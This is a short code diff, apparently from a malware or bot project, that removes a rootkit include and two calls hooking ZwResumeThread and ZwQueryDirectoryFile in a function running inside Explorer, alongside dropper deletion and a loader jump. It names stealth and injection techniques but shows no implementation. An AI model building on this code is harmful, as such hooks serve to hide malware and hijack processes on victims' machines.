@@ -9,7 +9,6 @@
 
 #include "Exploit.h"
 #include "BotUtils.h"
-#include "Rootkit.h"
 #include "Inject.h"
 #include "Unhook.h"
 #include "Config.h"
@@ -100,10 +99,7 @@ void ExplorerMain()
 
 	DeleteDropper();
 
-	HookZwResumeThread();
-	HookZwQueryDirectoryFile();
 
-	
 	if ( !dwAlreadyRun )
 		MegaJump( LoaderRoutine );
 	
